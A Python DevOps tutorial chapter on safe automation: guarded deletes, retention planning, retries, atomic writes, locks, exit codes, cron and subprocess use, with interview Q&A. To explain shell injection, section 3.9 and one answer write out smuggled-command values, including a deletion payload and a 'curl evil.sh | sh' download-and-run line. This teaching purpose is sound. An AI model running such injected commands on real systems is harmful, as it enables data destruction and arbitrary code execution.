Python for DevOps 3:
Automation Scripts & Resilience

Anyone can write a script that works once on their laptop. The job is writing the script that is still safe at 3 a.m. on a production box, when the disk is full, the network is flaky, the cron job fires twice, and someone runs it by hand "just to check." This chapter is about the habits that separate the two: dry-runs, injected clocks, idempotency, atomic writes, locks, retries that don't melt the service they're retrying, honest exit codes, and never letting user input near a shell.

3.1 — Filesystem Automation With pathlib, shutil and tempfile

pathlib.Path is the modern way to touch the filesystem from a script: paths are objects, / joins them, and .parent, .name, .suffix, .read_text(), .rglob() replace a pile of os.path.join calls and string slicing. Two habits matter more than the API: build test data in a throwaway directory (tempfile.mkdtemp() or TemporaryDirectory()) so your automation never has to be tried out on real data, and make every step safe to repeat (mkdir(parents=True, exist_ok=True) instead of "create it and crash if it exists"). The helper below builds a small file tree with fixed contents and fixed modification times, and you'll reuse it for the next few sections.

Build a sandbox file tree, then walk it
import os, tempfile from pathlib import Path def make_tree(root, spec): """spec maps 'relative/path' -> (content_bytes, epoch_mtime).""" for rel, (data, mtime) in spec.items(): p = root / rel p.parent.mkdir(parents=True, exist_ok=True) # exist_ok => safe to re-run p.write_bytes(data) os.utime(p, (mtime, mtime)) # pin mtime so output is deterministic root = Path(tempfile.mkdtemp(prefix='do03-')) make_tree(root, { 'app/logs/app.log': (b'x' * 5000, 1_700_000_000), 'app/logs/app.log.1': (b'y' * 20000, 1_699_000_000), 'app/cache/blob.bin': (b'z' * 90000, 1_698_000_000), 'app/config.yaml': (b'name: demo\n', 1_700_500_000), }) for p in sorted(root.rglob('*')): if p.is_file(): print(f'{p.relative_to(root).as_posix():<20} {p.stat().st_size:>6} bytes')

shutil covers the operations pathlib doesn't: shutil.copy2(src, dst) copies and preserves timestamps (plain copy doesn't), shutil.copytree and shutil.rmtree handle whole directories, and shutil.disk_usage(path) returns total/used/free bytes for the filesystem a path lives on. The dangerous one is deletion. Automation that deletes must prove the target is inside the directory it was pointed at, after resolving .. segments and symlinks — otherwise a bad config value or a crafted filename turns your cleanup script into rm -rf on something precious.

Refuse to delete outside the allowed root
import os, tempfile from pathlib import Path def safe_delete(target, root): target, root = Path(target).resolve(), Path(root).resolve() if target == root or not target.is_relative_to(root): raise ValueError(f'refusing to delete {target.name}: it is outside the allowed root') target.unlink() root = Path(tempfile.mkdtemp()) (root / 'old.log').write_text('stale') outside = Path(tempfile.mkdtemp()) / 'precious.db' outside.write_text('do not touch') safe_delete(root / 'old.log', root) print('deleted inside root:', not (root / 'old.log').exists()) try: safe_delete(root / '..' / outside.parent.name / 'precious.db', root) except ValueError as e: print('blocked:', e) print('precious.db survived:', outside.exists())
🚫
Resolve first, then compare. Checking str(target).startswith(str(root)) on the raw path is a classic bug: /data/backups-old starts with /data/backups, and /data/backups/../secrets passes the string test but points elsewhere. Path.resolve() followed by is_relative_to() compares real locations, and the extra target == root check stops someone deleting the root itself.
3.2 — A Disk-Usage Report (the du -sh You Can Test)

"The disk is 94% full — what's eating it?" is a daily question, and du -sh * | sort -h answers it in a shell. Writing the same thing in Python is worth it the moment you need to run it on a schedule, alert on a threshold, or post the result to a chat channel. The recipe is always the same: walk the tree with rglob('*'), keep only files (is_file()), attribute each file's st_size to a bucket (here, the top-level directory), then sort. Keep the byte-counting separate from the formatting: a function that returns numbers is testable, one that prints strings is not.

Usage per top-level directory, largest first
import os, tempfile from pathlib import Path def make_tree(root, spec): """spec maps 'relative/path' -> (content_bytes, epoch_mtime).""" for rel, (data, mtime) in spec.items(): p = root / rel p.parent.mkdir(parents=True, exist_ok=True) # exist_ok => safe to re-run p.write_bytes(data) os.utime(p, (mtime, mtime)) # pin mtime so output is deterministic def human(n): for unit in ('B', 'KB', 'MB', 'GB'): if n < 1024 or unit == 'GB': return f'{n} B' if unit == 'B' else f'{n:.1f} {unit}' n /= 1024 def usage_by_top_dir(root): totals = {} for p in root.rglob('*'): if p.is_file(): top = p.relative_to(root).parts[0] totals[top] = totals.get(top, 0) + p.stat().st_size return totals root = Path(tempfile.mkdtemp()) make_tree(root, { 'var/log/syslog': (b'a' * 1_800_000, 0), 'var/log/auth.log': (b'a' * 240_000, 0), 'var/cache/pkg.tar': (b'b' * 5_200_000, 0), 'home/deploy/.bashrc': (b'c' * 3_800, 0), 'tmp/scratch.dat': (b'd' * 640, 0), }) usage = usage_by_top_dir(root) for name, size in sorted(usage.items(), key=lambda kv: kv[1], reverse=True): print(f'{name:<6}{human(size):>10}') print(f'{"TOTAL":<6}{human(sum(usage.values())):>10}')
💡
Size on disk ≠ file size. st_size is the logical length. Filesystems allocate whole blocks, sparse files report a large logical size but use little space, and hard links make the same data appear under two names. du reports blocks actually used (st_blocks * 512). For a "why is the disk full" report that must match df, use st_blocks; for "how big is this backup," st_size is right. Also remember that a deleted file still held open by a process keeps consuming space until the process exits — a classic cause of "df says full, du says empty."
3.3 — Finding Duplicate Files by Content

Duplicate detection is a good example of writing automation that scales. The naive version hashes every file — fine for 100 files, painful for 5 million or for a 200 GB tree. The trick is that a hash is only needed to distinguish files that could be equal, and two files can only be equal if they are the same size. So: group by size first (a cheap stat), skip every size that appears once, and hash only the survivors. Hash in fixed-size chunks so memory stays flat no matter how large the file is — path.read_bytes() on a 50 GB file is an out-of-memory kill waiting to happen.

Group by size, then hash only the candidates
import hashlib, os, tempfile from pathlib import Path def make_tree(root, spec): """spec maps 'relative/path' -> (content_bytes, epoch_mtime).""" for rel, (data, mtime) in spec.items(): p = root / rel p.parent.mkdir(parents=True, exist_ok=True) # exist_ok => safe to re-run p.write_bytes(data) os.utime(p, (mtime, mtime)) # pin mtime so output is deterministic def sha256_of(path, chunk_size=65536): h = hashlib.sha256() with open(path, 'rb') as f: while chunk := f.read(chunk_size): # constant memory, even for a 50 GB file h.update(chunk) return h.hexdigest() def find_duplicates(root): by_size = {} for p in root.rglob('*'): if p.is_file(): by_size.setdefault(p.stat().st_size, []).append(p) hashed, groups = 0, {} for size, paths in by_size.items(): if len(paths) < 2: continue # a unique size cannot have a duplicate: skip the hash for p in paths: hashed += 1 groups.setdefault(sha256_of(p), []).append(p.relative_to(root).as_posix()) dupes = sorted(sorted(g) for g in groups.values() if len(g) > 1) return dupes, hashed root = Path(tempfile.mkdtemp()) make_tree(root, { 'releases/app-1.0.tgz': (b'BINARY-A' * 500, 0), 'backup/app-1.0.tgz': (b'BINARY-A' * 500, 0), 'releases/app-1.1.tgz': (b'BINARY-B' * 500, 0), # same size, different content 'notes/todo.txt': (b'rotate certs', 0), # unique size: never hashed }) dupes, hashed = find_duplicates(root) print('duplicate groups:', dupes) print('files hashed:', hashed, 'of 4')
⭐
Read the output for what it teaches: three of four files were hashed, not four — todo.txt had a unique size and never touched the disk again. The two app-1.x.tgz releases had identical sizes but different content, and the hash correctly kept them apart, which is why "same size" is never enough on its own. For adversarial or compliance-grade comparisons use SHA-256 (as here); for a quick internal dedupe MD5 or a fast non-cryptographic hash is fine — just don't call it "verification."
3.4 — Retention and Rotation Policies With an Injected Clock

Every system that produces files (logs, backups, build artifacts, snapshots) eventually needs a rule for deleting them, and that rule is the most dangerous code in the whole script. Three design decisions keep it safe. One: compute a plan (what to keep, what to delete) as a pure function, and only then act on it — that makes a dry-run trivial. Two: never call datetime.now() inside the logic; pass now in. The function becomes deterministic, unit-testable at any date, and you can replay "what would have been deleted last Tuesday." Three: combine an age rule with a count rule — keep anything newer than N days or among the newest K. The count rule is the seatbelt.

A pure retention planner (age OR newest-K)
import re from datetime import datetime, timedelta, timezone NOW = datetime(2025, 3, 15, 12, 0, tzinfo=timezone.utc) # injected clock: never call now() inside the logic def backup_date(name): m = re.search(r'(\d{4}-\d{2}-\d{2})', name) return datetime.strptime(m.group(1), '%Y-%m-%d').replace(tzinfo=timezone.utc) def plan_retention(names, now, keep_days, keep_last): newest_first = sorted(names, key=backup_date, reverse=True) cutoff = now - timedelta(days=keep_days) keep, delete = [], [] for i, name in enumerate(newest_first): if i < keep_last or backup_date(name) >= cutoff: keep.append(name) else: delete.append(name) return keep, delete names = ['db-2025-03-14.sql.gz', 'db-2025-03-13.sql.gz', 'db-2025-03-12.sql.gz', 'db-2025-03-05.sql.gz', 'db-2025-02-20.sql.gz', 'db-2025-01-01.sql.gz'] keep, delete = plan_retention(names, NOW, keep_days=7, keep_last=2) print('keep :', keep) print('delete:', delete) stalled = ['db-2025-01-01.sql.gz', 'db-2024-12-31.sql.gz', 'db-2024-12-30.sql.gz'] # backup job broke in January keep, delete = plan_retention(stalled, NOW, keep_days=7, keep_last=2) print('stalled job still keeps:', keep)
⚠️
Why "newest K" matters. Look at the second call: the backup job broke in January, so by March every backup is older than 7 days. A pure age rule would delete them all — and you would discover the outage only when you needed a restore. Keeping the newest K regardless of age turns "silently deleted our last good backup" into "kept two stale ones, and monitoring should already be screaming that the newest is 2 months old."
3.5 — Retries With Exponential Backoff and Jitter

Networks and APIs fail transiently: a connection reset, a 503 during a deploy, a rate-limit response. A retry turns most of those into non-events — but a naive retry (while True: try again immediately) is one of the most reliable ways to turn a small outage into a big one. The standard recipe has four parts. Bounded attempts (a budget, not infinity). Exponential backoff: wait 1s, 2s, 4s, 8s… so a struggling service gets breathing room, capped at a max_delay. Jitter: randomize each wait so a thousand clients that failed together don't all retry together (the thundering herd). And selectivity: retry only errors that can plausibly succeed next time (ConnectionError, TimeoutError, HTTP 429/502/503/504) — never a ValueError or a 400/404, because a malformed request stays malformed.

A retry decorator with injected sleep and jitter
import functools, time def retry(max_attempts=4, base_delay=1.0, factor=2.0, max_delay=30.0, jitter=lambda cap: cap, sleep=None, retry_on=(ConnectionError, TimeoutError)): sleep = sleep or time.sleep def decorator(fn): @functools.wraps(fn) def wrapper(*args, **kwargs): for attempt in range(max_attempts): try: return fn(*args, **kwargs) except retry_on: if attempt == max_attempts - 1: raise # budget spent: surface the real error cap = min(max_delay, base_delay * factor ** attempt) sleep(jitter(cap)) return wrapper return decorator delays, calls = [], {'n': 0} @retry(max_attempts=4, base_delay=1.0, jitter=lambda cap: cap / 2, sleep=delays.append) def flaky(): calls['n'] += 1 if calls['n'] < 3: raise ConnectionError('connection reset by peer') return 'ok' print(flaky(), 'after', calls['n'], 'calls; slept', delays) @retry(sleep=delays.append) def bad_input(): raise ValueError('malformed payload') # a bug in the request will not fix itself: no retry try: bad_input() except ValueError as e: print('not retried:', e)

Notice the two injection points, sleep and jitter. In production they default to time.sleep and a random function; in a test you pass delays.append and a fixed function, so the test runs instantly and asserts the exact schedule. Code that hard-wires time.sleep(random.uniform(...)) can only be tested by waiting. The common production jitter is full jitter: random.uniform(0, cap) — sleep anywhere from zero to the backoff cap — which spreads retries most evenly.

🚫
Only retry what is safe to repeat. If the request might have succeeded before the connection dropped, retrying a non-idempotent call (POST /charge, "send email", "increment counter") can double-apply it. Either retry only idempotent operations (GET, PUT, DELETE by id), or attach an idempotency key so the server can recognize a repeat. Also set a per-attempt timeout: a retry loop around a call that can hang forever never gets to retry.
3.6 — Idempotency, Atomic Writes and Locks

A script is idempotent if running it twice leaves the system in the same state as running it once. It is the property that makes automation safe to re-run after a crash, safe to schedule aggressively, and safe for a nervous human to run "just to be sure." You get it by describing the desired end state rather than the action: "ensure this line is in the file", not "append this line"; "ensure the directory exists", not "create the directory." The second half of the safety story is atomic writes: if a script crashes halfway through writing a config file, or a reader opens it mid-write, they see a truncated file. Write the new content to a temp file in the same directory, then os.replace() it into place — a single atomic rename, so readers see either the complete old file or the complete new one.

ensure_line: idempotent and atomic
import os, tempfile from pathlib import Path def atomic_write(path, text): path = Path(path) tmp = path.with_name(path.name + '.tmp') tmp.write_text(text) os.replace(tmp, path) # atomic on one filesystem: readers see the old file or the new one, never half def ensure_line(path, line): path = Path(path) lines = path.read_text().splitlines() if path.exists() else [] if line in lines: return False # already correct -> do nothing (idempotent) atomic_write(path, '\n'.join(lines + [line]) + '\n') return True d = Path(tempfile.mkdtemp()) hosts = d / 'hosts.txt' print(ensure_line(hosts, '10.0.0.5 db01')) # True -> changed something print(ensure_line(hosts, '10.0.0.5 db01')) # False -> second run is a no-op print(ensure_line(hosts, '10.0.0.6 db02')) print(hosts.read_text(), end='') print(sorted(p.name for p in d.iterdir())) # no leftover .tmp file

The last piece is stopping two copies of the script running at once — cron fires while the previous run is still going, or two engineers run it together. A lock serializes them. The simplest portable lock is a file created with the exclusive-create flag: open(path, 'x') succeeds for exactly one caller and raises FileExistsError for everyone else. Wrap it in a context manager so it is always released, even when the body raises.

A file lock as a context manager
import tempfile from pathlib import Path class LockHeld(Exception): pass class FileLock: def __init__(self, path): self.path = Path(path) def __enter__(self): try: self.path.open('x').close() # 'x' = create exclusively; fails if the file exists except FileExistsError: raise LockHeld(f'{self.path.name} is held by another run') from None return self def __exit__(self, *exc): self.path.unlink(missing_ok=True) # always release, even if the body raised return False d = Path(tempfile.mkdtemp()) with FileLock(d / 'janitor.lock'): try: with FileLock(d / 'janitor.lock'): print('this must never print') except LockHeld as e: print('second run refused:', e) print('lock released:', not (d / 'janitor.lock').exists())
⚠️
Stale locks. A file lock survives a kill -9 or a power loss, so the next run is locked out forever. Real tools store the owner PID (and check it is still alive), set a lock timeout, or use OS-level advisory locks (fcntl.flock) that the kernel releases automatically when the process dies. os.replace() is atomic only within one filesystem — that's why the temp file lives next to its destination, not in /tmp.
3.7 — Exit Codes, argparse Subcommands and Structured Logging

When your script runs under cron, a CI job, a Kubernetes Job or a systemd unit, nobody reads its output — the scheduler looks at the exit code. Zero means success; anything else means failure, and the platform reacts (retry, alert, mark the pipeline red). So a script that prints "ERROR: backup failed" and then exits 0 has told a human but lied to the machine. The conventions: 0 success, 1 general failure, 2 usage error (which argparse uses for you), 128+N "killed by signal N" (137 = SIGKILL, 143 = SIGTERM). The pattern that makes this testable is a main(argv=None) -> int function that returns the code, called as sys.exit(main()) only at the very bottom. Tests call main([...]) with an explicit argument list — no real command line needed.

argparse subcommands with an explicit argv, and honest exit codes
import argparse, contextlib, io def build_parser(): p = argparse.ArgumentParser(prog='janitor') sub = p.add_subparsers(dest='command', required=True) plan = sub.add_parser('plan', help='show what would be deleted') plan.add_argument('--dir', required=True) plan.add_argument('--keep-days', type=int, default=7) plan.add_argument('--keep-last', type=int, default=3) run = sub.add_parser('run', help='actually delete') run.add_argument('--dir', required=True) run.add_argument('--yes', action='store_true', help='required to really delete') return p def main(argv=None): try: args = build_parser().parse_args(argv) except SystemExit as e: return e.code # argparse exits with 2 on bad usage print('command =', args.command, '| dir =', args.dir) return 0 print('exit code:', main(['plan', '--dir', '/backups', '--keep-days', '14'])) err = io.StringIO() with contextlib.redirect_stderr(err): code = main(['run']) # forgot --dir print('exit code:', code) print(err.getvalue().strip().splitlines()[-1]) # In a real script the last line is: sys.exit(main())

Subcommands (janitor plan vs janitor run --yes) are how you keep the dangerous action behind a deliberate flag: the default command shows what would happen. Logging matters just as much in unattended scripts. Plain print lines are fine for a human; structured (JSON) logs let Loki, CloudWatch, Datadog or jq filter on fields — level == "ERROR", file == "db-2025-01-01.sql.gz" — instead of regex-ing prose.

JSON log lines with the logging module
import json, logging, sys class JsonFormatter(logging.Formatter): def format(self, record): payload = {'level': record.levelname, 'msg': record.getMessage()} payload.update(getattr(record, 'fields', {})) return json.dumps(payload, sort_keys=True) log = logging.getLogger('janitor') log.handlers.clear() # re-running this cell must not duplicate output handler = logging.StreamHandler(sys.stdout) handler.setFormatter(JsonFormatter()) log.addHandler(handler) log.setLevel(logging.INFO) log.propagate = False log.info('plan computed', extra={'fields': {'keep': 3, 'delete': 2, 'dry_run': True}}) log.error('delete failed', extra={'fields': {'file': 'db-2025-01-01.sql.gz', 'errno': 13}})
⭐
Log the decision and its inputs, never the secrets. "Deleted 5 files (keep_days=7, keep_last=2, dry_run=False)" is a log line you can debug from six months later. Tokens, passwords and connection strings should never reach a log — mask them before they get near the logger. In a real service add a timestamp field (the logging module's record.created) and a correlation/run ID so one execution's lines can be grouped.
3.8 — Cron Expressions: Knowing When Your Script Runs

Most of the scripts in this chapter run from cron or something that copies its syntax (Kubernetes CronJob, GitHub Actions schedule, CloudWatch rules). Five fields — minute hour day-of-month month day-of-week — each accepting *, a number, a list (1,15), a range (1-5), and a step (*/5, 10-50/10). Writing a matcher is the quickest way to actually understand the semantics, and it is a favorite interview exercise because it hides real gotchas: cron numbers Sunday as 0 (and also 7) while Python's weekday() starts at Monday = 0, and — the famous one — when both day-of-month and day-of-week are restricted, cron fires when either matches, not both.

A cron-expression matcher
from datetime import datetime def field_matches(field, value, lo, hi): for part in field.split(','): step, has_step = 1, '/' in part if has_step: part, step = part.split('/') step = int(step) if part == '*': start, end = lo, hi elif '-' in part: start, end = map(int, part.split('-')) else: start = int(part) end = hi if has_step else start # "5/20" means 5-hi every 20 if start <= value <= end and (value - start) % step == 0: return True return False def cron_matches(expr, dt): minute, hour, dom, month, dow = expr.split() if not (field_matches(minute, dt.minute, 0, 59) and field_matches(hour, dt.hour, 0, 23) and field_matches(month, dt.month, 1, 12)): return False cron_dow = (dt.weekday() + 1) % 7 # cron: Sunday = 0; Python: Monday = 0 dom_ok = field_matches(dom, dt.day, 1, 31) dow_ok = field_matches(dow, cron_dow, 0, 7) or (cron_dow == 0 and field_matches(dow, 7, 0, 7)) if dom != '*' and dow != '*': return dom_ok or dow_ok # BOTH restricted => OR, not AND (classic cron gotcha) return dom_ok and dow_ok cases = [ ('*/5 * * * *', datetime(2025, 3, 17, 12, 0)), # every 5 minutes ('*/5 * * * *', datetime(2025, 3, 17, 12, 3)), ('0 2 * * 1-5', datetime(2025, 3, 17, 2, 0)), # Monday 02:00 ('0 2 * * 1-5', datetime(2025, 3, 16, 2, 0)), # Sunday 02:00 ('0 0 13 * 5', datetime(2025, 6, 6, 0, 0)), # a Friday that is NOT the 13th ('0 0 13 * 5', datetime(2025, 6, 10, 0, 0)), # a Tuesday that is not the 13th ] for expr, dt in cases: print(f'{expr:<14} {dt:%a %Y-%m-%d %H:%M} -> {cron_matches(expr, dt)}')
⚠️
Read the fifth and sixth lines again. 0 0 13 * 5 reads like "midnight on Friday the 13th," but it fires on every Friday and on every 13th — the OR rule. Other operational traps: cron uses the server's local time zone (a 02:30 job vanishes or runs twice around a DST change — prefer UTC servers), a job that runs longer than its interval overlaps with itself (that's what the lock from 3.6 is for), and a missed run (machine was down) is simply skipped, not caught up.
3.9 — Running Other Programs Safely: subprocess, Signals and Parallel Host Checks

Sooner or later a script has to call git, kubectl, rsync or pg_dump. subprocess needs a real operating system, so the real calls below are reference only in this browser sandbox — but the injection problem they defend against you can demonstrate right here with shlex. The rule is simple: pass an argument list, never a shell string built from input.

What a shell would do with unsanitized input
import shlex user_input = 'backup.tar.gz; rm -rf /tmp/important' unsafe = f'ls -l {user_input}' print('shell=True would run :', unsafe) print('...parsed as :', shlex.split(unsafe)) # two commands, not one safe_string = f'ls -l {shlex.quote(user_input)}' print('with shlex.quote :', safe_string) print('...parsed as :', shlex.split(safe_string)) # one filename argument print('best: an argv list :', ['ls', '-l', user_input]) # no shell involved at all
🎬
Reference code — no Run button. The blocks below use real processes, signals and threads, which the browser's WebAssembly sandbox cannot provide. Run them in a terminal on a Linux box or in Colab; the patterns are what interviewers ask about.
Safe subprocess pattern: list argv, check, timeout, capture — reference only
import subprocess def git_status(repo): try: result = subprocess.run( ["git", "status", "--porcelain"], # list: no shell, no injection cwd=repo, check=True, # non-zero exit -> CalledProcessError capture_output=True, text=True, timeout=30, # never let a hung child hang you ) except subprocess.TimeoutExpired: raise RuntimeError("git status timed out") except subprocess.CalledProcessError as e: raise RuntimeError(f"git failed ({e.returncode}): {e.stderr.strip()}") return result.stdout.splitlines() # DANGEROUS: shell=True with interpolated input # subprocess.run(f"grep {pattern} app.log", shell=True) # pattern = "x; curl evil.sh | sh" -> arbitrary command execution as the script's user
Graceful shutdown: handle SIGTERM, finish the current unit of work — reference only
import signal, time stop = False def handle_sigterm(signum, frame): global stop stop = True # set a flag; do NOT do heavy work in the handler signal.signal(signal.SIGTERM, handle_sigterm) # Kubernetes/systemd send SIGTERM first... signal.signal(signal.SIGINT, handle_sigterm) # ...and Ctrl-C sends SIGINT while not stop: process_next_batch() # finish whatever is in flight time.sleep(1) cleanup_and_exit() # release locks, flush logs, exit 0 # Kubernetes then waits terminationGracePeriodSeconds (default 30s) and sends SIGKILL, # which cannot be caught.
Checking many hosts in parallel with a thread pool — reference only
from concurrent.futures import ThreadPoolExecutor, as_completed def check(host): ... # I/O bound: ssh, HTTP health check, TCP connect return host, True hosts = [f"web{n:02d}.example.internal" for n in range(1, 201)] failed = [] with ThreadPoolExecutor(max_workers=20) as pool: # bound the parallelism; don't open 200 sockets at once futures = [pool.submit(check, h) for h in hosts] for fut in as_completed(futures, timeout=120): try: host, ok = fut.result() except Exception as exc: failed.append(str(exc)) else: if not ok: failed.append(host) print(f"{len(failed)} unhealthy")
💡
Threads vs processes vs asyncio for ops work. Checking hosts, calling APIs and waiting on SSH are I/O bound: the GIL is released while a thread waits on a socket, so a thread pool (or asyncio) gives near-linear speed-ups. Compressing or hashing lots of data is CPU bound: threads don't help under the GIL, use ProcessPoolExecutor. And always reap what you start: a child launched with Popen that is never wait()ed becomes a zombie — dead, but still holding a process-table entry until its parent collects the exit status.
DevOps 3 Summary
  • Test on a throwaway tree, and guard every delete — resolve paths and check they sit inside the allowed root before removing anything.
  • Separate the plan from the action. A pure planner with an injected now gives you dry-runs, deterministic tests and replayable history.
  • Retention = age rule OR newest-K rule. The count rule stops a broken backup job from causing a total wipe.
  • Retry transient errors only, with bounded attempts, exponential backoff, a cap and jitter — and only for operations that are safe to repeat.
  • Idempotent, atomic, locked: declare end state, write temp-then-os.replace, and serialize runs with an exclusive lock that is always released.
  • Exit codes are the API to your scheduler; structured logs are the API to your log platform. Return codes from main(), log JSON, never log secrets.
  • Cron has sharp edges: Sunday is 0 (or 7), day-of-month and day-of-week combine with OR, and schedules run in server-local time.
  • Never build shell strings from input. Use argument lists, timeouts and check=True; handle SIGTERM; reap child processes.

💼 Automation & Resilience — Interview Prep

12 questions that DevOps, SRE and platform interviewers ask about production scripting — the "how do you make this safe to run unattended?" angle. Click a question to reveal what a strong answer sounds like.

What does it mean for a script to be idempotent, and how do you make one?▶
Running it twice leaves the system in exactly the state running it once would. You get there by expressing desired end state instead of actions: mkdir(exist_ok=True), "ensure this line is present," "create the user unless it exists," UPDATE ... SET status='done' rather than counter += 1. It matters because automation gets re-run — after a crash, by a retry, by cron overlapping, by a human who isn't sure the last run finished. A strong answer names a non-idempotent trap (appending to a file, sending an email, incrementing a counter) and the fix (check-then-act under a lock, an idempotency key, or a state file recording what's already done).
What should you retry, and what should you never retry?▶
Retry transient failures: connection resets, timeouts, HTTP 429/502/503/504. Never retry errors that cannot fix themselves — 400/401/403/404, validation errors, bugs — you just repeat the failure more slowly and add load. The second axis is safety: only retry operations that are idempotent (GET, PUT, DELETE by id), or make them so with an idempotency key, because a timeout does not tell you whether the server did the work. Always bound the attempts and the total time, and put a timeout on each attempt, or the retry loop itself becomes the outage.
Why exponential backoff with jitter? What is a thundering herd?▶
Exponential backoff (1s, 2s, 4s… capped) gives a struggling dependency progressively more breathing room. Without jitter, every client that failed at the same moment retries at the same moments — synchronized waves that can keep a recovering service down. Jitter randomizes each wait so retries spread out. The usual formulation is full jitter: sleep random.uniform(0, min(cap, base * 2**attempt)). Bonus points: mention that the failure is often correlated (a deploy or a network blip hits everyone at once), which is exactly when jitter matters, and that a retry budget or circuit breaker stops retries from amplifying an outage.
Why is subprocess.run(cmd, shell=True) with user-influenced input dangerous, and how do you run commands safely?▶
With shell=True the string goes through /bin/sh, so metacharacters — ;, &&, backticks, $( ), newlines — are interpreted. A value like x; curl evil | sh becomes arbitrary command execution as your script's user. Safe pattern: pass a list (['grep', '--', pattern, path]) so there is no shell, plus check=True, timeout=... and capture_output=True. The -- stops a value that starts with - being read as an option (argument injection). If you truly need a shell, shlex.quote() every interpolated value, and never build commands from untrusted data.
How do you update a config file so a crash or a concurrent reader never sees a half-written file?▶
Write the new content to a temporary file in the same directory (same filesystem), flush and fsync it if durability matters, then os.replace(tmp, target). A rename within one filesystem is atomic on POSIX, so readers see either the complete old file or the complete new one. The same-filesystem detail is the follow-up interviewers probe: a rename across filesystems degrades to copy-then-delete and is not atomic. Also mention that atomic replace protects readers but does not serialize two writers — for that you add a lock, or a version check.
What is a zombie process and how can a Python script create one?▶
A zombie is a process that has exited but whose exit status has not been collected by its parent, so it keeps a process-table entry (state Z in ps). A script creates them by starting children with subprocess.Popen (or os.fork) and never calling wait()/communicate()/poll(). A few are harmless; thousands exhaust the PID table. Fix: use subprocess.run (waits for you), or always wait(). Long-running daemons in containers add another wrinkle — PID 1 must reap orphaned children, which is why images use an init like tini or Docker's --init.
What do exit codes mean, and why should a script return them properly?▶
Zero is success; non-zero is failure. Schedulers, CI systems, Kubernetes Jobs and systemd all key off the exit status, not your output — a script that logs "backup failed" and exits 0 is invisible to alerting. Conventions: 1 for a general error, 2 for a usage error (argparse does this), 126/127 for "not executable / not found", and 128+N when killed by signal N (137 = SIGKILL, often the OOM killer; 143 = SIGTERM). In Python: structure the script as def main(argv=None) -> int and finish with sys.exit(main()), so tests can call main([...]) and assert on the returned code.
You have to write a script that deletes old files. How do you make that safe?▶
Layers: (1) compute a plan as a pure function and default to a dry-run, requiring an explicit flag to delete; (2) only touch files that match a strict pattern, and report what was skipped rather than deleting unknown files; (3) resolve paths and verify each target is inside the intended root before unlinking; (4) combine the age rule with a keep-newest-K rule so a broken producer can't cause a total wipe; (5) inject the clock so behavior is testable; (6) log every decision with its inputs; (7) make it idempotent and lock against concurrent runs. Being able to list these unprompted is what distinguishes someone who has been paged for a cleanup script gone wrong.
How should a long-running worker handle SIGTERM, for example inside Kubernetes?▶
On pod termination Kubernetes sends SIGTERM, waits terminationGracePeriodSeconds (default 30s), then sends SIGKILL, which cannot be caught. So the handler should just set a flag; the main loop finishes the current unit of work, releases locks, flushes logs and exits 0. Do not do heavy work inside the signal handler itself (it runs between bytecodes, and only in the main thread). Related details worth naming: make the process PID 1's signal-aware (or use an init), stop accepting new work first, and use preStop hooks or readiness gating so the load balancer stops sending traffic before shutdown starts.
What are the classic cron gotchas?▶
(1) When both day-of-month and day-of-week are restricted, cron fires when either matches, so 0 0 13 * 5 runs every Friday and every 13th. (2) Time zone: cron uses the host's local time, so a 02:30 job is skipped or doubled around daylight-saving changes — run servers in UTC. (3) Overlap: a run that outlasts its interval collides with the next one; guard with a lock or concurrencyPolicy: Forbid in Kubernetes. (4) Missed runs are not replayed. (5) Sunday is 0 (and 7), and the minimal cron environment has a tiny PATH and no shell profile, so scripts that work interactively fail there — use absolute paths.
Threads, processes or asyncio for checking 500 hosts? What about compressing 500 files?▶
Checking hosts is I/O bound: the thread spends its time waiting on the network, and CPython releases the GIL while waiting, so a ThreadPoolExecutor (bounded, e.g. 20–50 workers) or asyncio gives large speed-ups; asyncio scales to more concurrent connections with less memory but needs async-aware libraries. Compressing or hashing files is CPU bound: under the GIL threads don't help, so use ProcessPoolExecutor (or multiprocessing), which sidesteps the GIL with separate interpreters. Always cap concurrency — an unbounded pool can exhaust file descriptors, trip rate limits, or hammer the very systems you're checking.
How would you find duplicate files across a very large directory tree efficiently?▶
Never hash everything up front. Stage it: (1) group by file size — a stat is cheap and files of different sizes cannot be equal; (2) for size groups with 2+ files, hash a small prefix (say the first 4 KB) to eliminate most non-matches cheaply; (3) full SHA-256 only for prefix matches, read in fixed-size chunks so memory stays constant; (4) optionally a final byte-for-byte compare before deleting anything, since the cost of a false positive is data loss. Mention hard links (same inode is not a duplicate to reclaim) and symlinks (don't follow them blindly).
